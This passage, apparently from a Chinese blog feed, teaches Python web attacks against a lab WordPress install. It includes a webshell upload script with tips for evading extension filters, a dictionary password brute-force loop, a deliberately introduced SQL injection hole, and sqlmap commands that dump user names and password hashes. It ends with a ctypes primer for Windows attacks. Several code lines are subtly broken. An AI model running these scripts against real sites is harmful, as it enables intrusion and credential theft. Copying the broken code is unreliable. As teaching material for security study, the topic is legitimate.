class="token punctuation">)</span>        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span>value<span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''    设置传送文件：将创建类时作为参数传入的files列表值设置为form-data格式    除name外，还另外设置filename与contentType，向数据部分输入文件内容    '''</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>key<span class="token punctuation">,</span>fd<span class="token punctuation">)</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>        file_size<span class="token operator">=</span>os<span class="token punctuation">.</span>fstat<span class="token punctuation">(</span>fd<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span>stat<span class="token punctuation">.</span>ST_SIZE<span class="token punctuation">]</span>        filename<span class="token operator">=</span>fd<span class="token punctuation">.</span>name<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        contenttype<span class="token operator">=</span>mimetypes<span class="token punctuation">.</span>guess_type<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">or</span> <span class="token string">'application/octet-stream'</span>        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'--%s'</span> <span class="token operator">%</span>BOUNDARY<span class="token punctuation">)</span>        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Content-Disposition:form-data; name="%s";filename="s" '</span> <span class="token operator">%</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Content-Type:%s'</span> <span class="token operator">%</span>contenttype<span class="token punctuation">)</span>        fd<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        L<span class="token punctuation">.</span>append<span class="token punctuation">(</span>'\r\n<span class="token punctuation">;</span><span class="token operator">+</span>fd<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'--'</span><span class="token operator">+</span>BOUNDARY<span class="token operator">+</span><span class="token string">'--'</span><span class="token punctuation">)</span>    L<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>    body<span class="token operator">=</span>CRLF<span class="token punctuation">.</span>join<span class="token punctuation">(</span>L<span class="token punctuation">)</span>    contenttype<span class="token operator">=</span><span class="token string">'multipart/form-data;boundary=%s'</span> <span class="token operator">%</span>BOUNDARY    <span class="token keyword">return</span> contenttype<span class="token punctuation">,</span>body<span class="token triple-quoted-string string">'''设置fields：创建要作为参数传递给类的fields列表，一般指定为传递给服务器的值设置HTTP Analyzer中查看的所有值，WordPress中，经过一段时间后，之前创建的值会失效，所以不要使用此处的值，而使用通过HTTP Analyzer分析得到的值'''</span>fields<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token punctuation">(</span><span class="token string">"post_id"</span><span class="token punctuation">,</span><span class="token string">"59"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">"_wpnonce"</span><span class="token punctuation">,</span><span class="token string">"7716717b8c"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">,</span><span class="token string">"upload-attachment"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span><span class="token string">"webshell.html"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># various types file test</span><span class="token triple-quoted-string string">'''打开要传送的文件，创建要作为参数传递给类的files列表此时，可以从HTTP Analyzer获取用作name的asyn-upload值'''</span>fd<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"webshell.html"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">)</span>files<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"async-upload"</span><span class="token punctuation">,</span>fd<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token triple-quoted-string string">'''创建表单数据，创建类后，作为结果返回content-type与body。body对应于表单数据调用文件上传URL时，两个值都要传送'''</span>content_type<span class="token punctuation">,</span>body<span class="token operator">=</span>encode_multipart_formdata<span class="token punctuation">(</span>fields<span class="token punctuation">,</span>files<span class="token punctuation">)</span><span class="token keyword">print</span> body</code></pre><p>结果：<br><img src="https://www.hualigs.cn/image/60574fda83633.jpg" alt=""></p><ul><li>为确保系统安全，通常禁止用户上传可以在服务器中运行的文件。因此，通常采用如下方式不断修改文件扩展名，反复尝试攻击<ul><li>放入特殊字符：尝试文件上传时，文件名放入%、空格、*、/、\等特殊字符，这些字符可能会在处理扩展名时引发错误</li><li>重复扩展名：比如webshell.txt.php、webshell.txt.txt.txt.php等</li><li>编码：使用迂回方法，比如webshell.php.kr、webshell.php.iso8859-8（希伯来语编码）等</li></ul></li><li>前述两段代码可组合为一个攻击程序<ul><li>登录过程中创建的Opener对象内部含有Cookie信息，若使用该Opener对象再次调用URL，Cookie就会被原封不动地包含到HTTP头部进行传送，即可顺利通过认证</li><li>调用文件上传URL，上传文件的位置信息将被包含到Response并一同传回，即可发动Web shell攻击</li><li>运行结果，将url处理后放入地址栏即可</li></ul></li><li>在程序中可以修改HTTP头与体数据，为供给提供了很大便利。比如，Web服务器会根据User-Agent值修改UI与脚本，若在PC中随意修改User-Agent，就能发动多种攻击</li><li>密码破解攻击或Web shell攻击中，通过使用循环语句不断修改输入值，可以尝试进行多种攻击<br>3/21/2021 9:58:50 PM </li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web攻击--密码破解攻击</title>
      <link href="2021/03/21/web-gong-ji-mi-ma-po-jie-gong-ji/"/>
      <url>2021/03/21/web-gong-ji-mi-ma-po-jie-gong-ji/</url>
      
        <content type="html"><![CDATA[<ul><li>与PHP/JSP类似，Python也可以访问Web页面<ul><li>借助urllib与urllib2模块可以实现对Web页面的访问。urllib中，使用key1=value1&amp;key2=value2的方式创建POST消息，就像HTTP协议一样。在urlllib2中创建Request对象，访问Web服务器，返回Response对象<br><img src="https://www.hualigs.cn/image/605709bfdbab9.jpg" alt=""></li></ul></li></ul><h2 id="一、URLLIB与URLLIB2"><a href="#一、URLLIB与URLLIB2" class="headerlink" title="一、URLLIB与URLLIB2"></a>一、URLLIB与URLLIB2</h2><ul><li><p>不可相互替代，搭配使用，urllib2是urllib的增强，但是urllib中有urllib2中所没有的函数</p></li><li><p>urllib仅可接受URL，urllib2.openurl可接受Request参数，从而控制HTTP Request的header部分。如果访问网站，想更改User Agent（伪装浏览器），就要用urllib2</p></li><li><p>urllib支持设置编码函数，urllib.urlencode。在模拟登录的时候，经常要post编码之后的参数</p></li><li><p>1.Request对象：使用urllib模块，创建HTTP协议的头部与体部。使用GET方法传送时，无需单独创建Request对象，只要创建URL使用HTTP传送模块即可。而使用POST方法传送，或需要修改请求头的值或传递Cookie时，必须创建Request对象进行传递</p></li><li><p>2.HTTP传送：使用urllib2提供的函数，直接访问指定URL，无需额外为套接字通信做其它工作。以参数值的形式传递URL，若需要，可以一起传递Request对象。该函数支持浏览器提供的大部分通信功能</p></li><li><p>3.服务器：URL指向Apache Web服务，Apache Web服务器分析HTTP头部与体部，访问指定服务，然后将结果创建为HTTP协议的形式，传送给黑客PC</p></li><li><p>4.Response对象：响应依据HTTP协议格式返回，并以Response对象形式返回，这样才能在应用程序中使用</p></li><li><p>5.黑客PC：通过Response对象提供的函数，可以访问返回的URL、HTTP状态码、头信息及数据</p></li></ul><p>进行黑客攻击通常需要做大量重复性工作。如果直接通过浏览器攻击Web网站，就要不断手动修改输入值，并反复点击。但如果可以在应用程序内部访问Web网站并接收结果值，那么只需要使用简单的几行python代码即可攻破目标网站</p><p><strong>例：</strong></p><p>此外，Python提供的urllib与urllib2模块还有其它功能。与cookielib一起使用可以将Cookie值传递给Web服务器，维持会话。这样就可以连接需要登录的网站，下载文件或者上传XSS攻击所需的各种文件</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token keyword">import</span> urllib2url<span class="token operator">=</span><span class="token string">"http://server/wordpress/wp-login.php"</span><span class="token triple-quoted-string string">'''URL指出WordPress的登录页面，相应输入值放入用户名与密码'''</span>values<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'log'</span><span class="token punctuation">:</span><span class="token string">'python'</span><span class="token punctuation">,</span><span class="token string">'pwd'</span><span class="token punctuation">:</span><span class="token string">'python1'</span><span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#设置POST传送值：以列表形式传送</span><span class="token triple-quoted-string string">'''设置头部：可以随意设置HTTP头部'''</span>headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agentent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/4.0(compatible; MSIE5.5; Windows NT)'</span><span class="token punctuation">}</span><span class="token triple-quoted-string string">'''对POST值编码：将值设置为HTTP协议所用形式'''</span>data<span class="token operator">=</span>urllib<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''创建Request对象：创建Request对象时，若只简单调用URL，则放入URL参数即可'''</span>request<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''调用Web网页：连接通信会话，调用Web页面，使用Request对象'''</span>response<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"#URL: %s"</span> <span class="token operator">%</span>response<span class="token punctuation">.</span>gerurl<span class="token punctuation">(</span><span class="token punctuation">)</span>    #输出<span class="token keyword">print</span> <span class="token string">"#CODE: %s"</span> <span class="token operator">%</span>response<span class="token punctuation">.</span>getcode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"#INFO: %s"</span> <span class="token operator">%</span>response<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"#DATA: %s"</span> <span class="token operator">%</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：<br><img src="https://www.hualigs.cn/image/605709bfc83b7.jpg" alt=""></p><h2 id="二、Web密码破解攻击"><a href="#二、Web密码破解攻击" class="headerlink" title="二、Web密码破解攻击"></a>二、Web密码破解攻击</h2><ul><li>假设Web应用不在登录程序中检查密码错误的次数，则可在程序中访问Web页面，借助循环不断尝试输入不同词典密码(sqlmap模块提供的wordlist)</li><li>为简化示例逻辑，假设已知用户ID，或使用谷歌搜索多种形式的用户ID形成ID词典</li><li>要自动提交用户名与密码，需事先知道它们保存于哪些变量，需要具备HTML、JavaScript基础</li><li>分析登录页面HTML源码，<form>标记的action字段用于指定接收用户输入的页面。<input>标记的name字段用于设置保存用户输入值的变量名</form></li><li>在网站输入密码时，若密码输错次数超过指定次数，系统通常会暂时锁定用户，或者停用账号，借此防御外部攻击。通过Web防火墙等安全设备可以轻松阻止此类攻击，但依然有很多网站安全意识薄弱，运行的系统含有多种漏洞，甚至连密码破解这种初级攻击方式也无法抵御</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token keyword">import</span> urllib2url<span class="token operator">=</span><span class="token string">"http://server/wordpress/wp-login.php"</span>user_login<span class="token operator">=</span><span class="token string">"python"</span>    <span class="token comment" spellcheck="true">#出于便利，假设已知用户名</span>wordlist<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'wordlist.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#攻击词典</span>passwords<span class="token operator">=</span>wordlist<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> password <span class="token keyword">in</span> passwords<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#循环，不断测试与指定ID密码是否匹配</span>    password<span class="token operator">=</span>password<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    values<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'log'</span><span class="token punctuation">:</span>user_login<span class="token punctuation">,</span><span class="token string">'pwd'</span><span class="token punctuation">:</span>password<span class="token punctuation">}</span>    data<span class="token operator">=</span>urllib<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>values<span class="token punctuation">)</span>    request<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">)</span>    response<span class="token operator">=</span>urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#登录检测：若正常登录，则进入管理员页面</span>        idx<span class="token operator">=</span>response<span class="token punctuation">.</span>geturl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'wp-admin'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        idx<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>idx<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#检测密码成功</span>        <span class="token keyword">print</span> <span class="token string">"######success!###### [="</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">"]"</span>        <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"######failed!###### ["</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">"]"</span>wordlist<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>3/21/2021 5:00:01 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web攻击--SQL注入</title>
      <link href="2021/03/19/web-gong-ji-sql-zhu-ru/"/>
      <url>2021/03/19/web-gong-ji-sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Web服务模式"><a href="#一、Web服务模式" class="headerlink" title="一、Web服务模式"></a>一、Web服务模式</h2><p><img src="https://www.hualigs.cn/image/60549af556d79.jpg" alt=""></p><h2 id="二、搭建测试环境"><a href="#二、搭建测试环境" class="headerlink" title="二、搭建测试环境"></a>二、搭建测试环境</h2><p><img src="https://www.hualigs.cn/image/60549af56f676.jpg" alt=""></p><ul><li>服务器PC中搭建用于黑客攻击的Web网站</li><li>为了测试方便，AMP、Wordpress均使用默认设置，数据库名称为wordpress，所有账号/密码全部设为python</li><li>黑客PC中开发用于入侵Web网站的Python程序</li><li>客户机PC执行普通用户的正常操作</li><li>修改虚拟PC网络设置（NAT/内网、windows防火墙、host文件）</li></ul><p>WordPress使用了安全编码，不容易进行攻击</p><ul><li>为了成功进行攻击，可安装安全性相对较差的插件（视频相关插件），下载插件后解压缩，将其放入服务器目录</li><li>打开提供环境访问功能的程序文件C:\APM_Setup\htdocs\wordpress\wpcontent\plugins\all-wideo-gallery\config.php，修改代码</li></ul><pre class=" language-python"><code class="language-python"><span class="token operator">/</span><span class="token operator">*</span>$_vid<span class="token operator">=</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'vid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token operator">/</span>    <span class="token comment" spellcheck="true">#[原始代码]处理为注释</span><span class="token operator">/</span><span class="token operator">*</span>$_pid<span class="token operator">=</span><span class="token punctuation">(</span>int<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'pid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token operator">/</span>    <span class="token comment" spellcheck="true">#[原始代码]处理为注释</span>$_vid<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'vid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#[新代码]删除（int）</span>$_pid<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'pid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#[新代码]删除（int）</span></code></pre><h2 id="三、SQL注入"><a href="#三、SQL注入" class="headerlink" title="三、SQL注入"></a>三、SQL注入</h2><ul><li>利用应用程序的安全漏洞</li><li>SQL注入攻击主要向（接收并处理用户输入）变量值插入攻击代码以发动攻击</li></ul><pre class=" language-python"><code class="language-python"><span class="token operator">//</span>常用的用户认证代码$query<span class="token operator">=</span><span class="token string">"SELECT * FROM USER WHERE ID=$id and PWD=$pwd"</span>$result<span class="token operator">=</span>MySQL<span class="token punctuation">:</span>query<span class="token punctuation">(</span>$query<span class="token punctuation">,</span>$connect<span class="token punctuation">)</span></code></pre><ul><li>向网页上的id栏输入如下值：”1 OR 1=1–”</li><li>提交后组成如下SQL语句</li></ul><pre class=" language-python"><code class="language-python"><span class="token string">"SELECT * FROM USER WHERE ID=1 OR 1=1 -- and PWD=$pwd"</span>    <span class="token operator">//</span><span class="token operator">-</span><span class="token operator">-</span>后变为SQL注释</code></pre><ul><li>要成功进行SQL注入，必须不断更改输入值，找出系统漏洞。这是简单的重复工作，所以可以通过编写程序实现自动化</li><li>Python提供了实现这种自动化的多种模块，其中最具代表性的是sqlmap(sqlmap.org)</li><li>下载解压zip文件后，放入C:\Python\sqlmap目录，运行目录下的sqlmap.py文件即可安装</li><li>使用sqlmap进行黑客攻击的流程</li><li>将Web网站视为“黑盒”，从最简单的信息开始，一点点找出所需信息。发动SQL注入攻击一般经过如下5个步骤：<ul><li>1.搜索URL：SQL注入攻击基于URL，主要攻击目标是GET方法，将用户的输入值添加到URL并进行传送。可以很容易搜到攻击目标URL，攻击特定网站时，要尝试打开多个页面，观察URL的变化。此时，需要具备HTML与JavaScript相关知识</li><li>2.寻找漏洞：使用sqlmap.py程序，可以寻找所选URL的漏洞。由于大部分应用程序都含有防御SQL注入攻击的代码，所以需要使用Web爬虫等自动化工具，找出含有漏洞的URL。Web爬虫程序能够从指定网站下载多个页面，并且分析HTML代码，找出有可能被攻击的URL</li><li>3.搜索数据库：找到目标URL的漏洞后，搜索数据库中有哪些数据表。分析表名就能知道哪些表含有重要信息</li><li>4.搜索列：搜索所选表中的列。由于列名能够反映数据特征，所以能够轻松找出包含重要信息的列</li><li>5.访问数据：访问所选列包含的数据。若数据处于加密状态，sqlmap将使用字典攻击技术对数据解密</li></ul></li></ul><h2 id="四、实例"><a href="#四、实例" class="headerlink" title="四、实例"></a>四、实例</h2><ul><li>此处省略对URL进行搜索的过程，直接尝试对config.php（用于提供WordPress插件的环境信息）发动SQL注入攻击</li><li>转到C:\Python\sqlmap目录，输入命令</li></ul><pre class=" language-python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://server/wordpress/wp-content/plugins/all-video-gallery/config.php?vid=1&amp;pid=1"</span> <span class="token operator">-</span><span class="token operator">-</span>level <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>risk <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>dbms MySQL</code></pre><p>sqlmap支持多种选项，上述命令中用到的几个选项中，-u选项表示后面出现的是URL，–level选项表示要执行的测试级别，–risk选项用于设置待执行测试的风险等级，–dbms选项指定要使用的数据库类型（若不指定，则对sqlmap支持的所有类型的数据库探测漏洞）</p><ul><li><p>–level选项，测试级别</p><ul><li>0：仅输出Python反向追踪(traceback)信息、错误及重要信息(Critical Message)</li><li>1：显示信息与警告信息，该值为默认值</li><li>2：同时显示所有调试信息</li><li>3：同时显示插入的有效载荷信息</li><li>4：同时显示HTTP请求信息</li><li>5：同时显示HTTP响应头信息</li><li>6：同时显示HTTP响应页面内容信息</li></ul></li><li><p>–risk选项，用于设置待执行测试的风险，表示攻击所用SQL代码的危险程度，风险等级越高，表示相关网站出现问题的可能性越高</p><ul><li>1：注入无问题代码，执行测试，默认值（Normal Injection（使用union）、Blind Injection（使用true：1=1，false：1=2））</li><li>2：执行Time-based Injection using heavy query。进行Blind Injection时，若不论真假都有相同结果值，则经过指定的待机时间后，通过测定时间判断插入的查询是否得以执行</li><li>3：使用OR-based Injection。若被攻击的目标程序执行update语句，则插入的or语句就会导致致命问题</li></ul></li><li><p>探测漏洞结果<br><img src="https://www.hualigs.cn/image/60549af5bb2dd.jpg" alt=""></p></li></ul><p>由探测结果可知，vid与pid存在漏洞。通过改变两个变量的输入值，可以进一步获取更多信息</p><ul><li>利用找到的漏洞，继续搜索数据库中有哪些表</li></ul><pre class=" language-python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://server/wordpress/wp-content/plugins/all-video-gallery/config.php?vid=1&amp;pid=1"</span> <span class="token operator">-</span><span class="token operator">-</span>level <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>risk <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>dbms MySQL <span class="token operator">-</span><span class="token operator">-</span>tables</code></pre><p>–tables选项用于获取数据表列表。使用–table选项可以读取数据库中所有表的信息，然后找出含有用户信息的数据表</p><ul><li>数据表搜索结果<br><img src="https://www.hualigs.cn/image/60549af589a23.jpg" alt=""></li></ul><p>观察数据表列表可以发现，wp_users最有可能保存用户数据</p><ul><li>继续从wp_users数据表中提取所有数据列</li></ul><pre class=" language-python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://server/wordpress/wp-content/plugins/all-video-gallery/config.php?vid=1&amp;pid=1"</span> <span class="token operator">-</span><span class="token operator">-</span>level <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>risk <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>dbms MySQL <span class="token operator">-</span>T wp_users <span class="token operator">-</span><span class="token operator">-</span>columns</code></pre><p>-T选项用于指定数据表<br>–columns选项用于从指定数据表提取所有数据列</p><ul><li>数据列搜索结果<br><img src="https://www.hualigs.cn/image/60549af4e7955.jpg" alt=""></li></ul><p>从搜索的数据列看，数据列user_login与user_pass分别保存用户ID与密码。只要得到用户名与密码，对网站的攻击就成功了。</p><ul><li>最后一步：从user_login与user_pass字段提取用户登录信息</li></ul><pre class=" language-python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://server/wordpress/wp-content/plugins/all-video-gallery/config.php?vid=1&amp;pid=1"</span> <span class="token operator">-</span><span class="token operator">-</span>level <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>risk <span class="token number">3</span> <span class="token operator">-</span><span class="token operator">-</span>dbms MySQL <span class="token operator">-</span>T wp_users <span class="token operator">-</span><span class="token operator">-</span>columns <span class="token operator">-</span>C user_login<span class="token punctuation">,</span> user_pass <span class="token operator">-</span><span class="token operator">-</span>dump</code></pre><p>-C选项 用于指定要进行攻击的数据列，指定多个数据列时用逗号隔开</p><p>–dump选项 用于从指定数据列提取所有数据</p><ul><li>数据提取结果<br><img src="https://www.hualigs.cn/image/60549af5247a2.jpg" alt=""></li></ul><p>数据提取过程中会遇到两个问题，一个为是否保存散列数据、另一个为是否对散列数据进行解密，全部选择y，使用sqlmap提供的解码工具可以对密码进行解密<br>3/19/2021 8:47:52 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>应用程序攻击</title>
      <link href="2021/03/18/ying-yong-cheng-xu-gong-ji/"/>
      <url>2021/03/18/ying-yong-cheng-xu-gong-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Windows应用程序的基本概念"><a href="#一、Windows应用程序的基本概念" class="headerlink" title="一、Windows应用程序的基本概念"></a>一、Windows应用程序的基本概念</h2><ul><li>对Windows应用程序进行黑客攻击，必须拥有Windows API基础知识</li><li>开发Windows应用程序时，往往要使用各种lib与DLL库</li><li>lib是静态库，生成Windows可执行文件（exe文件）时，它们被包含到程序</li><li>DLL是动态链接库，应用程序运行时，才会加载调用相应的DLL库。Win32API大部分以DLL库形式存在<br><img src="https://www.hualigs.cn/image/60534b2984c14.jpg" alt=""></li></ul><p>Win32 API提供了多种用于控制低级操作系统功能的接口，所以不仅用于开发一般程序，还广泛应用于程序调试与黑客攻击程序的开发</p><h2 id="二、在Python中使用Win32-API"><a href="#二、在Python中使用Win32-API" class="headerlink" title="二、在Python中使用Win32 API"></a>二、在Python中使用Win32 API</h2><ul><li>Python默认提供ctypes模块（ctypes在Python2和Python3中有所不同），通过它可以在Python代码中调用DLL，使用C/C++的变量类型（想实现更高级的黑客攻击技术，必须理解掌握ctypes）</li><li>ctypes可以在Windows、Linux、UNIX、OS X、Android等多种平台中使用</li><li>ctypes适合于“中轻量级”的Python、C/C++混合编程</li></ul><h2 id="三、ctypes模块的基本概念"><a href="#三、ctypes模块的基本概念" class="headerlink" title="三、ctypes模块的基本概念"></a>三、ctypes模块的基本概念</h2><ul><li><p>ctypes简化了动态库的调用过程，支持复杂的C数据类型，提供低级函数。使用ctypes模块时，只要遵守函数调用约定，即可直接调用操作系统提供的API<br><img src="https://www.hualigs.cn/image/60534b297553e.jpg" alt=""></p></li><li><p>由于本地库与Python的函数调用方式、数据类型等彼此不同，所以要熟悉基本的ctypes语法，准确实现二者间的映射</p></li><li><p>ctypes支持多种调用约定（Calling Convention）</p><ul><li>cdll=cdecl</li><li>windll=stdcll</li><li>oledll=stdcall（其返回值假定为HRESULT）</li></ul></li><li><p>cdecl是C/C++的默认调用约定</p><ul><li>参数从右至左传递（入栈），由调用者（caller）清理栈区</li></ul></li><li><p>stdcall是Windows API默认调用约定</p><ul><li>微软的WINAPI、CALLBACK等宏都是该调用约定</li><li>参数从右至左传递（入栈），被调用者（callee）清理栈区</li></ul></li><li><p>fastcall</p><ul><li>参数从右至左传递（入栈），前2/4个参数被分别放进了ecx、edx（、r8、r9）寄存器，被调用者（callee）清理栈区</li><li>Win64统一为类似fastcall的调用约定</li></ul></li></ul><h2 id="四、ctype基本用法"><a href="#四、ctype基本用法" class="headerlink" title="四、ctype基本用法"></a>四、ctype基本用法</h2><h3 id="1-加载DLL和获取函数"><a href="#1-加载DLL和获取函数" class="headerlink" title="1.加载DLL和获取函数"></a>1.加载DLL和获取函数</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> platform<span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">if</span> platform<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'Windows'</span><span class="token punctuation">:</span>    libc<span class="token operator">=</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'msvcrt.dll'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#系统C标准库动态链接文件</span>    dll<span class="token operator">=</span>windll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span>dllpath<span class="token punctuation">)</span><span class="token keyword">elif</span> platform<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'Linux'</span><span class="token punctuation">:</span>    libc<span class="token operator">=</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span></code></pre><ul><li>使用哪一行代码取决于导出函数的调用规范（cdecl或stdcall）</li><li>也可以使用下面两行代码代替：</li></ul><pre class=" language-python"><code class="language-python">libc<span class="token operator">=</span>CDLL<span class="token punctuation">(</span><span class="token string">'msvcrt.dll'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#注意和上面大小写的区别</span>dll<span class="token operator">=</span>WinDll<span class="token punctuation">(</span>dllpath<span class="token punctuation">)</span></code></pre><ul><li>加载dll后，可得到dll中的导出函数</li></ul><pre class=" language-python"><code class="language-python">func<span class="token operator">=</span>dll<span class="token punctuation">.</span>func_name    <span class="token comment" spellcheck="true">#func_name是dll的导出函数</span></code></pre><ul><li>有些Windows动态链接库导出函数不是用名字，而是用序号（ordinal），这时需通过索引获取</li></ul><pre class=" language-python"><code class="language-python">func<span class="token operator">=</span>cdll<span class="token punctuation">.</span>kernel32<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></code></pre><ul><li>得到函数后，要进行正确的函数调用，需设置好参数和返回值类型</li></ul><h3 id="2-ctypes数据类型与C和Python对应关系"><a href="#2-ctypes数据类型与C和Python对应关系" class="headerlink" title="2.ctypes数据类型与C和Python对应关系"></a>2.ctypes数据类型与C和Python对应关系</h3><p><img src="https://www.hualigs.cn/image/60534b296c079.jpg" alt=""></p><ul><li>Python中的类型，除了None，int，long，Byte String，Unicode String作为C函数的参数默认提供转换外，其它类型都必须显式提供转换<ul><li>None：对应C中的NULL</li><li>int，long：对应C中的int，具体实现时会根据机器字长自动适配/截断</li><li>Byte String：对应C中的一个字符串指针char*，指向一块内存区域</li><li>Unicode String：对应C中一个宽字符串指针wchar_t*，指向一块内存区域</li></ul></li></ul><h3 